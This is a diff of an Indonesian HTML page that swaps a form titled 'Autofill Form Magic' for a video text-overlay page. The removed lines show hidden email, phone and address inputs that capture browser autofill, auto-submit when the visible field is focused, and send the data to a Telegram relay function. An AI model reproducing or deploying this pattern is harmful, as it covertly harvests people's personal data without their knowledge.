@@ -3,65 +3,25 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Autofill Form Magic</title>
+  <title>Overlay Teks ke Video</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
-    <h2>Isi 1 kolom saja</h2>
-    <form id="autofillForm" autocomplete="on">
-      <!-- Kolom utama yang terlihat -->
-      <input
-        type="text"
-        name="name"
-        placeholder="Klik sini (Nama)"
-        autocomplete="name"
-        required
-      />
+    <video id="video" controls>
+      <source src="your-video.mp4" type="video/mp4">
+      Your browser does not support HTML5 video.
+    </video>
 
-      <!-- Kolom tersembunyi lainnya untuk autofill -->
-      <input type="email" name="email" autocomplete="email" hidden />
-      <input type="tel" name="phone" autocomplete="tel" hidden />
-      <input type="text" name="address" autocomplete="street-address" hidden />
+    <div id="overlayContainer"></div>
 
-      <p id="status"></p>
-    </form>
+    <div class="form-area">
+      <h2>Set Overlay Teks</h2>
+      <div id="textInputs"></div>
+      <button onclick="applyOverlay()">Terapkan Teks</button>
+    </div>
   </div>
 
-  <script>
-    const form = document.getElementById("autofillForm");
-    const status = document.getElementById("status");
-
-    // Saat kolom diklik dan autofill aktif, tunggu sebentar lalu kirim otomatis
-    form.addEventListener("focusin", () => {
-      setTimeout(() => {
-        form.requestSubmit();
-      }, 500); // waktu tunggu autofill aktif
-    }, { once: true });
-
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      status.textContent = "Mengirim data...";
-
-      const formData = new FormData(form);
-      const data = Object.fromEntries(formData.entries());
-
-      try {
-        const res = await fetch("/.netlify/functions/sendToTelegram", {
-          method: "POST",
-          body: JSON.stringify(data),
-        });
-
-        if (res.ok) {
-          status.textContent = "Terkirim ke Telegram ✅";
-          form.reset();
-        } else {
-          status.textContent = "Gagal mengirim ❌";
-        }
-      } catch (err) {
-        status.textContent = "Error koneksi ❌";
-      }
-    });
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
